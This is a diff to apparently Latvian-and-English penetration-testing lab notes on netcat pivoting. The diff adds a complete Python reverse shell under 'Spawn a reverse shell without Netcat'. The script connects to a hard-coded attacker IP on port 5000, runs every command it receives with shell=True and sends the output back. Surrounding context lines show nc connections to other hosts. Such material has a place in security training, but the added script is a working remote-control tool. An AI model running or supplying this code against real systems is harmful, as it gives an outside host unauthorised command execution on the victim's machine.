@@ -367,12 +367,41 @@ nc 203.0.113.10 5000
 ### Pivot uz mērķi no jump-hosta
 ```
 nc 192.168.1.101 5000
-
 ```
 
 ## 3.6. Spawn a reverse shell without Netcat
+### Python Reverse Shell Script:
 ```
-123
+import socket
+import subprocess
+
+# uzbruceja parametri
+ATTACKER_IP = '95.68.18.10'
+ATTACKER_PORT = 5000
+
+# izveido socket konekciju
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ATTACKER_IP, ATTACKER_PORT))
+
+print(s.recv(1024).decode())
+
+# palaiz shell
+while True:
+    
+    command = s.recv(1024).decode()
+   
+    if command.strip() == 'exit':
+        break
+
+    try:
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+    except Exception as e:
+        output = str(e).encode()
+
+    s.send(output)
+
+s.close()
+
 ```
 
 
